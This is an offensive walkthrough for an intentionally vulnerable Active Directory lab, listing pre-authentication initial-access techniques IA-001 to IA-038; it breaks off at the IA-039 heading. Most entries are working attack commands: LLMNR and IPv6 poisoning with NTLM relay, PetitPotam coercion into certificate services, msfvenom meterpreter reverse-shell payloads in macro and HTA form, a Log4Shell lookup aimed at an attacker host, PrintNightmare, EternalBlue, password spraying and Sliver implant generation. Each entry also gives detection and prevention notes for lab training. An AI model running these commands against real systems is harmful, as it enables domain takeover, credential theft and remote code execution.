# 02a — Initial Access (IA-001..050)

**You are not domain-joined. You are not running Windows. You are a Kali / BlackArch / Parrot box on the host bridge** (`virbr1`, `10.10.0.1`), staring at `10.10.0.0/21`. No creds, no shells, no agent. This page is everything you can try *before* you have a user-equivalent foothold on the corp.

> The previous version of this lab framed `ws01.corp.local` as the "attacker workstation." That's no longer the case — `ws01` is a domain-joined **victim workstation** (phishing landing, lateral target, credential goldmine). Your tools live on **your own Kali**, not on `ws01`.

```
┌─────────────────────────┐                            ┌──────────────────────────────┐
│   Kali / BlackArch      │   10.10.0.1  ─── virbr1 ─▶ │  corp.local 10.10.0.0/21      │
│   (your machine)        │                            │  dc01, ca01, file01, sql01,   │
│   - impacket            │   10.20.0.1  ─── virbr2 ─▶ │  ws01 (victim)                │
│   - certipy             │                            ├──────────────────────────────┤
│   - nxc / netexec       │   10.30.0.1  ─── virbr3 ─▶ │  finance.local 10.20.0.0/24   │
│   - mitm6 / Responder   │                            ├──────────────────────────────┤
│   - ntlmrelayx          │                            │  root.corp 10.30.0.0/24       │
│   - Coercer / PetitPotam│                            └──────────────────────────────┘
│   - Sliver / Mythic C2  │
└─────────────────────────┘
```

You can run *every tool in the previous walkthroughs from Kali*. WinRM, SMB, LDAP, RPC, Kerberos, ADCS web enrollment, MSSQL, even DCOM are all reachable from a Linux client. The only times you'd want code on a Windows host are: (a) lab `ws01` for OPSEC-realistic mimikatz testing, (b) executing post-exploitation `.exe`s you've already pushed.

---

## 0. Kali preparation (one-time)

```bash
sudo apt update
sudo apt install -y python3-impacket bloodhound bloodhound.py crackmapexec \
                    responder mitm6 hashcat hydra john \
                    smbclient enum4linux ldap-utils kerbrute \
                    proxychains4 freerdp2-x11 evil-winrm
pipx install netexec certipy-ad coercer
git clone https://github.com/topotam/PetitPotam.git
git clone https://github.com/Wh04m1001/DFSCoerce.git
git clone https://github.com/ly4k/PKINITtools.git
git clone https://github.com/dirkjanm/krbrelayx.git
```

Time-sync to the DC (Kerberos kills you on >5 min skew):
```bash
sudo chronyd -q "server 10.10.0.10 iburst"
# or
sudo rdate -n 10.10.0.10 || sudo ntpdate 10.10.0.10
```

Add a hosts entry so SPN names resolve (Kerberos *requires* hostnames):
```bash
sudo tee -a /etc/hosts <<EOF
10.10.0.10  dc01.corp.local corp.local
10.10.0.11  dc01.eu.corp.local eu.corp.local
10.10.0.12  ca01.corp.local
10.10.0.13  file01.corp.local
10.10.0.14  sql01.corp.local
10.10.0.100 ws01.corp.local
10.20.0.10  dc01.finance.local finance.local
10.30.0.10  dc01.root.corp root.corp
EOF
```

`krb5.conf` so Kerberos auth from Kali Just Works:
```bash
sudo tee /etc/krb5.conf <<'EOF'
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = true
    dns_lookup_kdc = true
    udp_preference_limit = 0

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        admin_server = dc01.corp.local
    }
    EU.CORP.LOCAL    = { kdc = dc01.eu.corp.local }
    FINANCE.LOCAL    = { kdc = dc01.finance.local }
    ROOT.CORP        = { kdc = dc01.root.corp }

[domain_realm]
    .corp.local        = CORP.LOCAL
    corp.local         = CORP.LOCAL
    .eu.corp.local     = EU.CORP.LOCAL
    .finance.local     = FINANCE.LOCAL
    .root.corp         = ROOT.CORP
EOF
```

Now you're ready to attack.

---

## Per-vector template

Every IA-XYZ writeup below follows the same shape:

```
### IA-XYZ — Title
What it is | Why it works in DVAD | Tools | Steps | Detection | Prevention
```

The IA series fills the gap between "lab is up" (`01-setup.md`) and "I have a domain user" (`02-recon.md` / `03-credential-access.md`). It is unapologetically pre-auth.

---

### IA-001 — Unauthenticated network sweep (host & service discovery)
**What it is:** map every host, port, and service on the lab subnets from your Kali. Foundation for everything else.
**Why it works in DVAD:** no NAC, no host-isolation, no segmentation between attacker bridge and lab.
**Tools:** `nmap`, `masscan`, `rustscan`, `netexec`.
**Steps:**
```bash
sudo nmap -sS -p- --min-rate 5000 10.10.0.0/21 -oA scan-tcp
sudo nmap -sU --top-ports 50 10.10.0.0/21       # find SNMP, DNS, NTP, NetBIOS, IKE
nxc smb 10.10.0.0/21                            # SMB version, signing, OS
nxc ldap 10.10.0.0/21                           # LDAP availability + naming context
```
**Detection:** IDS port-scan signatures; Windows Firewall logging Event `5152` blocked; Defender for Identity "reconnaissance using port scanning."
**Prevention:** segment by VLAN; restrict who can reach 88/135/389/445/5985 from non-corp networks; reduce service exposure surface.

---

### IA-002 — Anonymous SMB / null session enumeration
**What it is:** legacy SMB null bind exposes share lists, password policy, user/group enumeration on older configs.
**Why it works in DVAD:** Guest enabled, `RestrictAnonymous=0` on some hosts.
**Tools:** `smbclient`, `enum4linux-ng`, `rpcclient`, `nxc smb -u '' -p ''`.
**Steps:**
```bash
smbclient -L //10.10.0.10 -N
rpcclient -U "" -N 10.10.0.10
> querydominfo
> enumdomusers
> getdompwinfo
enum4linux-ng -A 10.10.0.13
nxc smb 10.10.0.0/24 -u '' -p '' --shares --users --pass-pol --rid-brute
```
**Detection:** Event `4625` from anonymous; `4798`/`4799` group enumeration; MDI "Reconnaissance using account enumeration."
**Prevention:** `RestrictAnonymous=2`, `RestrictAnonymousSAM=1`, disable Guest, SMB null sessions off.

---

### IA-003 — Anonymous LDAP bind
**What it is:** anonymous LDAP returns the rootDSE and (depending on `dsHeuristics`) parts of the directory tree.
**Why it works in DVAD:** default `dsHeuristics` allows anonymous rootDSE; `Pre-Windows 2000` group can give broader anon read.
**Tools:** `ldapsearch`, `windapsearch`.
**Steps:**
```bash
ldapsearch -x -H ldap://10.10.0.10 -b "" -s base "(objectclass=*)"   # rootDSE
ldapsearch -x -H ldap://10.10.0.10 -b "DC=corp,DC=local" -s sub "(objectclass=user)" sAMAccountName
windapsearch.py --dc-ip 10.10.0.10 -d corp.local --users
```
**Detection:** Event `2887` (LDAP anon binds); MDI alert on anonymous queries.
**Prevention:** `dsHeuristics`: 7th char `2` (no anonymous LDAP). Force LDAP signing.

---

### IA-004 — DNS recon (zone transfer + brute)
**What it is:** AD-integrated DNS often allows AXFR or anonymous queries.
**Why it works in DVAD:** AXFR enabled (REC-007).
**Tools:** `dig`, `dnsenum`, `dnsx`.
**Steps:**
```bash
dig @10.10.0.10 corp.local AXFR
dig @10.10.0.10 _ldap._tcp.dc._msdcs.corp.local SRV
dnsenum --dnsserver 10.10.0.10 corp.local
```
**Detection:** Event `6001` DNS AXFR.
**Prevention:** restrict zone transfers to named secondaries; disable AXFR.

---

### IA-005 — Username enumeration via Kerberos
**What it is:** the KDC returns different error codes for valid vs invalid principals when you request a TGT. Map valid usernames *without* a single failed-logon event on user accounts.
**Why it works in DVAD:** default Kerberos behaviour, no rate limiting.
**Tools:** `kerbrute userenum`.
**Steps:**
```bash
kerbrute userenum -d corp.local --dc 10.10.0.10 \
   /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt
```
**Detection:** Event `4768` with status `0x6` at burst rate; MDI "user enumeration with Kerberos."
**Prevention:** rare to mitigate without breaking Kerberos. Smart Lockout on the IdP side; detect with frequency anomaly.

---

### IA-006 — Kerbrute password spray (unauthenticated)
**What it is:** once you have a username list, spray a common password against the KDC. No NTLM event on the target host, low and slow.
**Why it works in DVAD:** lockout threshold = 0 (deliberate).
**Tools:** `kerbrute passwordspray`.
**Steps:**
```bash
kerbrute passwordspray -d corp.local --dc 10.10.0.10 valid_users.txt 'Password123!'
kerbrute passwordspray -d corp.local --dc 10.10.0.10 valid_users.txt "$(date +Summer%Y)!"
```
**Detection:** Event `4771` Kerberos pre-auth failed burst; MDI password spray.
**Prevention:** lockout threshold ≥ 5; smart lockout (Azure AD Password Protection); FIDO2.

---

### IA-007 — AS-REP roast without credentials
**What it is:** discover users with `DONT_REQUIRE_PREAUTH` set by trying AS-REQ with no auth — the KDC happily returns the AS-REP, which is crackable.
**Why it works in DVAD:** `svc_nopreauth` flagged.
**Tools:** `impacket-GetNPUsers -no-pass`.
**Steps:**
```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass \
   -usersfile valid_users.txt -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
**Detection:** Event `4768` with PreAuthType=0; MDI.
**Prevention:** clear `DONT_REQ_PREAUTH` on every account.

---

### IA-008 — LLMNR / NBT-NS / mDNS poisoning (Responder)
**What it is:** Windows hosts that fail a DNS lookup broadcast over LLMNR (UDP 5355), NBT-NS (UDP 137), or mDNS (UDP 5353). Answer the broadcast → victim authenticates to you → NTLMv2 hash → crack or relay.
**Why it works in DVAD:** intentional — LLMNR + NBT-NS left on; no DNS suffix search list.
**Tools:** `Responder` (Kali default).
**Steps:**
```bash
sudo responder -I virbr1 -wd
# wait for a victim mistyping a host name or auto-resolving wpad/proxy/printers
# captured hashes go to /usr/share/responder/logs/Responder-Session.log
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
**Detection:** MDI "LLMNR/NBT-NS Spoofing"; Sysmon Event `22` (unusual DNS).
**Prevention:** GPO disable LLMNR + NBT-NS; deploy DNS suffix search list; egress filter on UDP 5355/137.

---

### IA-009 — mitm6 (IPv6 stack abuse from external)
**What it is:** Windows always prefers IPv6 and asks for DHCPv6 on boot. You answer first → become the IPv6 DNS server → serve a `wpad.dat` → every browser uses you as proxy → catch NTLM → relay to LDAPS for delegation/group adds.
**Why it works in DVAD:** IPv6 enabled, no RA-Guard / DHCPv6-Guard.
**Tools:** `mitm6`, `ntlmrelayx.py`.
**Steps:**
```bash
sudo mitm6 -i virbr1 -d corp.local --ignore-nofqdn
# parallel terminal:
sudo ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh attacker.corp.local \
   --delegate-access -smb2support
# wait for a Windows host to ask for DHCPv6 (usually within seconds of any reboot or NIC bounce)
```
Outcome: ntlmrelayx writes RBCD on the victim's machine object → you can S4U2Self for any user to that machine → SYSTEM.
**Detection:** unsolicited DHCPv6 advertisements; new IPv6 default gateway in netsh; MDI "Suspected NTLM relay."
**Prevention:** disable IPv6 on workstations OR deploy RA-Guard + DHCPv6-Guard at switch level; disable WPAD; LDAP signing + channel binding.

---

### IA-010 — IPv6 link-local recon
**What it is:** even without DHCPv6, Windows speaks IPv6 link-local — `ping6 ff02::1` reveals every host on the segment, including ones that hide from IPv4 scans.
**Tools:** `ping6`, `ip -6 neigh`, `nmap -6`.
**Steps:**
```bash
ping6 -I virbr1 ff02::1 -c 4
ip -6 neigh
sudo nmap -6 -sS -p445,3389,5985 -PS ff02::1%virbr1
```
**Detection:** ICMPv6 echo bursts.
**Prevention:** RA-Guard; IPv6 disabled where unused.

---

### IA-011 — Unauthenticated MSSQL (SQL Browser + xp_cmdshell)
**What it is:** SQL Server Browser broadcasts instance metadata on UDP 1434; weak `sa` or sysadmin = `xp_cmdshell` = SYSTEM on the SQL host. Trust links across instances spider the chain.
**Why it works in DVAD:** SQL Browser on, `sa` enabled, mixed-mode auth.
**Tools:** `nxc mssql`, `impacket-mssqlclient`, `PowerUpSQL`.
**Steps:**
```bash
nxc mssql 10.10.0.0/24 --gen-relay-list relays.txt
nxc mssql 10.10.0.14 -u sa -p 'DVADlab2024!' --local-auth -x whoami
impacket-mssqlclient sa:'DVADlab2024!'@10.10.0.14
SQL> EXEC xp_cmdshell 'whoami'
SQL> EXEC sp_linkedservers
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED.SERVER]
```
**Detection:** SQL audit log; failed login bursts; MDI MSSQL recon.
**Prevention:** Windows auth only; disable SQL Browser; disable `xp_cmdshell`; least-priv service accounts.

---

### IA-012 — ADCS web enrollment unauth recon
**What it is:** `/certsrv/` and `/certsrv/certfnsh.asp` often answer pre-auth or with anon HTTP. Combined with ESC8, the next step is relay; but as plain recon you confirm the CA's hostname, the templates, and the auth scheme.
**Tools:** `curl`, `Certipy find -scheme http`.
**Steps:**
```bash
curl -i http://ca01.corp.local/certsrv/
curl -i http://ca01.corp.local/certsrv/certfnsh.asp
certipy find -u alice -p '<later>' -dc-ip 10.10.0.10 -vulnerable    # post-auth
```
**Detection:** IIS access logs to `/certsrv/`; baseline who hits it.
**Prevention:** require HTTPS; disable NTLM on web enrollment; EPA; restrict via firewall.

---

### IA-013 — PetitPotam / DFSCoerce unauthenticated coercion
**What it is:** **CRITICAL.** `EfsRpcOpenFileRaw` (MS-EFSRPC) over SMB can be triggered by *anonymous* RPC against unpatched Windows. No domain creds needed. Coerce DC$ → relay to ADCS → cert for DC$ → DCSync. This is the single most powerful initial-access primitive in DVAD.
**Why it works in DVAD:** EFSRPC reachable, no auth on the named pipe, ADCS web HTTP+NTLM, no EPA.
**Tools:** `PetitPotam.py`, `Coercer`, `ntlmrelayx.py`.
**Steps:**
```bash
# 1. Relay listener on Kali
sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
   --adcs --template DomainController -smb2support

# 2. Coerce DC01 unauthenticated (no -u/-p)
python3 PetitPotam.py -d '' -u '' -p '' 10.10.0.1 10.10.0.10
# 'unauthenticated' path uses anonymous EFSRPC handle
```
If the box is patched against pre-auth coercion, fall back to authenticated coercion with any low-priv creds (`Coercer.py coerce ...`).
Outcome: a base64 cert for DC01$. `certipy auth` → TGT → DCSync.

**Detection:** MDI "PetitPotam coercion"; ADCS Event `4886`/`4887` with cert for DC$ issued to non-DC requester; Sysmon `3` outbound NTLM from DC$.
**Prevention:** patch ADV210003 + KB5005413; **disable NTLM on ADCS web enrollment, force HTTPS + EPA**; RPC filter for `MS-EFSRPC`.

---

### IA-014 — ShadowCoerce / DFSCoerce / PrinterBug (variants)
**What it is:** family of unauthenticated/low-auth coerce primitives — `MS-FSRVP`, `MS-DFSNM`, `MS-RPRN`. Each is a different RPC interface; mitigation is per-interface.
**Tools:** `Coercer` (one tool, all vectors).
**Steps:**
```bash
python3 Coercer.py scan -u '' -p '' -t 10.10.0.10 -l 10.10.0.1
python3 Coercer.py coerce -u '' -p '' -t 10.10.0.10 -l 10.10.0.1 --filter-method-name EfsRpcOpenFileRaw
```
**Detection:** RPC pattern signatures (MDI); SMB outbound from coerced host.
**Prevention:** RPC filters (KB5005413), disable Spooler/DFS/FSRVP where unused.

---

### IA-015 — ZeroLogon (CVE-2020-1472) pre-auth
**What it is:** unauthenticated Netlogon attack — set the DC's machine password to empty, then DCSync as `DC01$`. Already documented as DF-035 but listed here because it is *pre-auth* and a true initial-access primitive.
**Tools:** `zerologon_tester.py`, `cve-2020-1472-exploit.py`.
**Steps:** see DF-035. **Always restore the original DC$ password with `reinstall_original_pw.py` before leaving** — otherwise SYSVOL/AD replication breaks.
**Detection:** MDI native; Event `5827`.
**Prevention:** patch + `FullSecureChannelProtection=1`.

---

### IA-016 — PrintNightmare (CVE-2021-34527) unauthenticated
**What it is:** with any low-priv domain creds (or sometimes anon if Point-and-Print is loose) call `RpcAddPrinterDriverEx` to load a DLL as SYSTEM on every spooler. Pre-auth variant exists where Point-and-Print is set to "no admin needed for new drivers."
**Tools:** `cve-2021-1675.py`, `PrintNightmare.py`, `SharpPrintNightmare.exe`.
**Steps:**
```bash
sudo smbserver.py -smb2support share /tmp/dll
# craft addprinter.dll that runs 'net user evil P@ss /add /domain'
python3 cve-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\addprinter.dll'
```
**Detection:** Event `316` PrintService driver-installed; Sysmon `7` DLL load by `spoolsv.exe`.
**Prevention:** patch; disable Print Spooler on DCs and servers that don't print; `RestrictDriverInstallationToAdministrators=1`.

---

### IA-017 — EternalBlue / SMBGhost
**What it is:** MS17-010 (EternalBlue, SMBv1) and CVE-2020-0796 (SMBGhost, SMBv3 compression). True pre-auth RCE on unpatched Windows. DVAD's base image is patched against these by default, but the Ansible role can re-enable SMBv1 for legacy interop drills.
**Tools:** `metasploit ms17_010_eternalblue`, `nmap --script smb-vuln-ms17-010`, `smbghost-poc`.
**Steps:**
```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.0.0/24
nxc smb 10.10.0.0/24 -M ms17-010
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.0.13; run"
```
**Detection:** Suricata/Snort ET rules; Sysmon `3` outbound SMB from non-MS-signed proc.
**Prevention:** disable SMBv1 (`sc config lanmanserver SMB1=0`); patch (March 2017 MS17-010, March 2020 CVE-2020-0796).

---

### IA-018 — Exchange ProxyShell / ProxyNotShell / ProxyLogon (pre-auth chain)
**What it is:** Exchange OWA/ECP pre-auth RCE chains. Not deployed in default DVAD topology but listed because PLAN.md §12 documents Exchange as an optional add-on.
**Tools:** `proxyshell.py`, `proxylogon.py`, `Sliver/CS Exchange profile`.
**Steps (representative):**
```bash
python3 proxyshell.py 10.10.0.50 administrator@corp.local
```
**Detection:** IIS log signatures (autodiscover.json with strange chars); Defender for Exchange; MDI.
**Prevention:** patch Exchange CU; isolate Exchange; certificate-based auth on OWA.

---

### IA-019 — Phishing: macro / VBA payload
**What it is:** classic. `.docm` / `.xlsm` with AutoOpen macro → shell. Delivered via email to a corp user (lab user account on `ws01`). DVAD ships `ws01` with Office disabled by default; install LibreOffice or trigger via `mshta` instead.
**Tools:** `msfvenom`, `macro_pack`, `EvilClippy`, Sliver/Mythic implant generator.
**Steps:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f vba -o macro.vba
# embed in .docm via macro_pack or manually
# deliver via fake e-mail / share drop on \\file01\Public
```
**Detection:** Office AMSI; Sysmon `1` `winword.exe`→`powershell.exe`/`mshta.exe`/`wmic.exe`; ASR rules.
**Prevention:** "Block all Office apps from creating child processes" ASR; Mark-of-the-Web on downloads; Application Guard for Office; macros disabled by default (Microsoft post-2022 default).

---

### IA-020 — Phishing: LNK / SCF / URL on writable share
**What it is:** drop `boring-report.lnk` on `\\file01\Public` (Authenticated Users write). The `.lnk`'s `IconLocation` is `\\attacker\share\icon.ico` → any user *who simply opens the folder* triggers an NTLM auth to you. Captures, sometimes relays.
**Tools:** `ntlm_theft.py`, `lnk-template`.
**Steps:**
```bash
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.0.1 --greedy
cp generated/*.lnk /tmp/landing/
smbclient //10.10.0.13/Public -U 'corp\alice%DVADlab2024!' -c 'put boring-report.lnk'
sudo responder -I virbr1 -wd
```
**Detection:** Sysmon `11` for `.lnk`/`.url`/`.scf` create; SMB `5145` for share writes; egress UDP 137/445 to attacker IP.
**Prevention:** egress block 445; SMB signing; remove write on shared folders; CASB.

---

### IA-021 — Phishing: HTML / browser-in-browser / OAuth consent
**What it is:** fake OAuth consent screen prompting the user to authorize "Microsoft 365 Admin Tools" → consent grant → token in your hand. Or BitB pixel-perfect rendering of a Microsoft logon prompt that submits creds to your server.
**Tools:** `evilginx2`, `Modlishka`, `BitB-template`.
**Steps:** stand up evilginx2 on Kali, configure for `login.microsoftonline.com` phishlet, deliver link.
**Detection:** anomalous Conditional Access sign-ins; new OAuth consents (audit log "Consent to application"); FIDO failure to non-FIDO MFA.
**Prevention:** disable user consent for new apps; require admin approval; phishing-resistant MFA (FIDO2).

---

### IA-022 — Phishing: HTA / mshta
**What it is:** `.hta` files run JScript/VBS via `mshta.exe` (signed Microsoft binary, LOLBIN). Easy initial RCE if user clicks.
**Tools:** `msfvenom -f hta-psh`, `Nishang Out-HTA`.
**Steps:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f hta-psh -o evil.hta
python3 -m http.server 8080
# trick a user to: mshta http://10.10.0.1:8080/evil.hta
```
**Detection:** Sysmon `1` `mshta.exe` from email client / browser; ASR rule "Block JavaScript/VBScript launching downloaded content."
**Prevention:** block `mshta.exe` via WDAC/AppLocker; remove the file association.

---

### IA-023 — Phishing: ISO / IMG / LNK-in-archive (Mark-of-the-Web bypass)
**What it is:** ISO/IMG containers strip MOTW when extracted, so the inner `.lnk` that runs `cmd.exe /c powershell -enc ...` runs without SmartScreen prompt.
**Tools:** `mkisofs`, custom packaging.
**Steps:**
```bash
mkdir delivery && cp evil.lnk shipping_note.docx delivery/
genisoimage -V "Invoice" -o invoice.iso delivery/
# deliver via email
```
**Detection:** EDR detects ISO mount in user session; Sysmon `1` `cmd.exe`/`powershell.exe` from removable drive.
**Prevention:** Microsoft's MOTW-on-extract update; group-policy disable ISO/IMG mounting for users.

---

### IA-024 — `.library-ms` / `.url` archive NTLM leak (CVE-2025-24071)
**What it is:** craft a `.library-ms` file with an attacker UNC; Explorer auto-resolves on archive extract → NTLMv2 leak. Documented in CRED-051 but listed here as a stand-alone *initial* access vector — the victim never had to click anything.
**Tools:** `LibraryMS-Generator`, `Responder`.
**Steps:**
```bash
cat > evil.library-ms <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.0.1\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
zip evil.zip evil.library-ms
sudo responder -I virbr1 -wd
```
**Detection:** MOTW + Explorer auto-resolve patterns; EDR signature.
**Prevention:** patch March 2025; SMB egress filter; SMB signing.

---

### IA-025 — VPN / SSL-VPN / Citrix unauthenticated CVEs
**What it is:** Fortinet (CVE-2022-42475, CVE-2024-21762), Citrix (CVE-2023-3519), Pulse Secure (CVE-2024-21887), Ivanti (CVE-2024-21893). Most engagements *start* here. DVAD doesn't host one by default but the playbook is identical.
**Tools:** CVE-specific PoCs; `nuclei` templates.
**Detection:** vendor IDS sigs; CVE-specific log signatures.
**Prevention:** patch — these get a TLP:RED advisory and exploitation within hours.

---

### IA-026 — Public-facing web RCE / ViewState / Log4Shell
**What it is:** ASP.NET ViewState deserialization (CVE-2017-9248-style with stolen `MachineKey`), Log4Shell (`${jndi:ldap://...}`), Spring4Shell, JNDI, deserialization gadgets. If the lab includes IIS or a custom .NET app, hit it.
**Tools:** `ysoserial.net`, `log4shell-scanner`, `nuclei`, `ViewStateExploitTool`.
**Steps (Log4Shell representative):**
```bash
java -jar marshalsec.jar LDAPRefServer "http://10.10.0.1:8888/#Exploit"
curl 'http://app.corp.local/login?username=${jndi:ldap://10.10.0.1:1389/Exploit}'
```
**Detection:** WAF JNDI signature; outbound LDAP to attacker; Sysmon `3` from Java/IIS worker; Defender for Cloud Apps.
**Prevention:** patch; egress filtering from app servers; remove serialization gadgets; ASP.NET ViewState MAC mandatory.

---

### IA-027 — RDP brute-force + Sticky-Keys (offline media)
**What it is:** RDP on 3389 from outside → brute or steal session. With physical media access, boot Linux, replace `sethc.exe` (Sticky Keys backdoor PER-003) — full SYSTEM cmd on lock screen.
**Tools:** `hydra`, `crowbar`, `xfreerdp`, live-USB.
**Steps:**
```bash
hydra -L users.txt -P passwords.txt rdp://10.10.0.100 -t 4
```
**Detection:** Event `4625` Logon Type 10 spray; geo-anomaly on RDP.
**Prevention:** Network Level Authentication (NLA); FIDO2; RDP behind VPN; BitLocker prevents offline sticky-keys backdoor.

---

### IA-028 — USB drop / BadUSB / Rubber Ducky
**What it is:** drop a USB labelled "Payroll Q3" — user inserts → autorun (rare today) or HID-emulating device (Ducky/BashBunny) types a PowerShell payload at hardware speed.
**Tools:** `Rubber Ducky`, `BashBunny`, `Flipper Zero`, `Hak5 OMG cable`.
**Detection:** Sysmon `9` HID device added; PowerShell logging.
**Prevention:** USB control policy (block HID class on managed endpoints); Constrained Language Mode; ASR "Block executable files running unless they meet a prevalence, age, or trusted list criterion."

---

### IA-029 — SCCM PXE Boot abuse
**What it is:** SCCM Operating System Deployment over PXE serves a boot image and a task sequence — if it doesn't require a PXE password, you can extract NAA credentials from the task sequence variables. Pre-auth, network-only.
**Tools:** `PXEThief`, `sccmwtf`, `sccmhunter pxe`.
**Steps:**
```bash
python3 PXEThief.py 4    # interactive workflow
```
**Detection:** SCCM site server logs; abnormal PXE boots; KB5009546 deny list.
**Prevention:** require PXE password; isolate PXE network; disable NAA (use enhanced HTTP/PKI).

---

### IA-030 — VLAN hop / Cisco discovery + DTP
**What it is:** if you plug into a trunk port (some lab variants), DTP negotiation makes the switch trust you with all VLANs. Then 802.1Q-tagged frames let you talk to internal-only VLANs.
**Tools:** `yersinia`, `scapy`, `vlan_hopper.py`.
**Steps:**
```bash
sudo yersinia -G            # GUI; DTP attack
sudo vconfig add eth0 10    # then attack VLAN 10
```
**Detection:** switch interface logs; DTP packets from unauthorized port.
**Prevention:** disable DTP on every access port; assign access VLAN explicitly; no native VLAN = 1.

---

### IA-031 — Watering hole / drive-by (chrome/edge 0-day or N-day)
**What it is:** compromise a site the corp visits, serve browser exploit. N-day Chromium/Edge bugs are still effective if patching lags.
**Tools:** Metasploit `browser_autopwn2`; commercial frameworks.
**Detection:** EDR exploit-mitigation signal; Microsoft Defender for Endpoint network protection.
**Prevention:** managed-browser policy; Smart App Control; Application Guard for Office/Edge.

---

### IA-032 — Cloud / Entra ID device-code phishing
**What it is:** request a device code from Microsoft (`/oauth2/devicecode`), send the code to the user with social engineering ("paste this code to access HR portal"), they authenticate, you get tokens — bypasses traditional MFA on first-party clients.
**Tools:** `TokenTactics`, `roadtools`, `AzureHound`.
**Steps:**
```powershell
Import-Module TokenTactics
$tokens = Invoke-DeviceCodeFlow -Resource "https://graph.microsoft.com"
# user opens the URL, enters the code -> you get refresh+access tokens
```
**Detection:** Entra sign-in log "Device Code" flow from unusual IP; Conditional Access "block unfamiliar sign-in properties."
**Prevention:** Conditional Access — block Device Code flow except where required; FIDO2; restrict OAuth consents.

---

### IA-033 — Implant delivery + C2 stand-up (Sliver / Mythic / Havoc)
**What it is:** once any IA path lands, you want a stable agent, not a one-shot reverse shell. Stand up an open-source C2 framework on Kali — encrypted, with profile + obfuscation.
**Tools:** `Sliver`, `Mythic`, `Havoc`, `Nighthawk` (commercial).
**Steps:**
```bash
# Sliver
sliver-server
> generate --http 10.10.0.1 --os windows --arch amd64 --save /tmp/i.exe
> http
# deliver i.exe via IA-019/020/022/023
```
**Detection:** EDR memory scanning; Sysmon `3` to non-corp IPs; JA3/JA4 TLS fingerprinting.
**Prevention:** EDR with behavioural rules; egress filter (only allow proxy); TLS inspection where lawful.

---

## IA-034..050 — Additional surfaces enabled by the ENUM-surface playbook

These vectors became reachable once `ansible/tasks/vuln-enum-surface.yml`
runs (Phase 6.4 of `site.yml`). If you're on an older deployment that
predates that file, re-run Ansible — none of these will work otherwise.

### IA-034 — SNMP public/private community read + write

`public` (RO) and `private` (RW) are configured on every server.
`private` lets you push registry values via `snmpset`.

```bash
# Identify SNMP hosts:
nmap -sU -p161 --open 10.10.0.0/21
# Walk system tree:
snmpwalk -v2c -c public 10.10.0.13                          # file01
snmpwalk -v2c -c public 10.10.0.10 1.3.6.1.4.1.77.1.2.25    # SAM/users (LanMan MIB)
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.4.1.77.1.2.27    # Shares
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.2.1.25.4.2.1.2   # Running processes
# Anything interesting → escalate to write:
snmpset -v2c -c private 10.10.0.13 1.3.6.1.2.1.1.5.0 s pwned
```
**Why it bites:** community strings travel cleartext UDP. From there you have
a credential-equivalent into the registry on the entire server fleet.
**Detection:** Sysmon UDP 161 from non-mgmt subnets; Windows Event Log SNMP service.
**Prevention:** SNMPv3 with auth+priv; remove `public`/`private`; restrict `PermittedManagers`.

---

### IA-035 — Anonymous FTP read on `file01`

IIS `Web-Ftp-Server` is installed on file01. If anonymous is permitted (lab default), you can pull whatever the FTP root exposes.

```bash
ftp 10.10.0.13               # USER anonymous, PASS anything
nmap --script ftp-anon,ftp-syst -p21 10.10.0.13
# Recursive grab:
wget -r ftp://anonymous:x@10.10.0.13/
```
**Detection:** IIS FTP log `u_exYYMMDD.log`; AccessDenied audits.
**Prevention:** Disable `Web-Ftp-Server` or require auth.

---

### IA-036 — Telnet brute on `file01`

`TlntSvr` runs on file01 (legacy enum practice).

```bash
nmap -p23 --script telnet-encryption,telnet-brute 10.10.0.13
hydra -L users.txt -P passwords.txt telnet://10.10.0.13 -t4
```
**Detection:** Security 4625 on file01; high TCP/23 connection rate.
**Prevention:** Don't ship Telnet. Use SSH.

---

### IA-037 — Anonymous NFS export read/write on `file01`

`C:\NFSExport` is shared as `DVAD_NFS` with `EnableAnonymousAccess $true` and `Permission readwrite`. This is the Windows equivalent of `no_root_squash`.

```bash
showmount -e 10.10.0.13
mkdir /mnt/dvad_nfs && sudo mount -t nfs 10.10.0.13:/DVAD_NFS /mnt/dvad_nfs
echo 'pwn' > /mnt/dvad_nfs/test.txt
# Plant a malicious LNK or .scf to trigger an NTLM leak when an admin browses
```
**Detection:** NFS log on file01; unfamiliar source IPs reading exports.
**Prevention:** Don't expose Windows NFS to untrusted networks; require kerberos auth.

---

### IA-038 — SMB1 / EternalBlue on `file01`

SMB1 is enabled **only** on file01 (deliberately gated so the rest of the lab isn't one-shotted). Practise the classic without nuking the lab.

```bash
nmap -p445 --script smb-protocols 10.10.0.13            # confirm SMB1 advertised
nmap -p445 --script smb-vuln-ms17-010 10.10.0.13
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.0.13; set LHOST 10.10.0.1; run'
```
**Detection:** Sysmon SMB1 dialect negotiation; ETW SMBServer.
**Prevention:** `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`.

---

### IA-039 — IIS WebDAV PROPFIND + relay endpoint on `ca01`

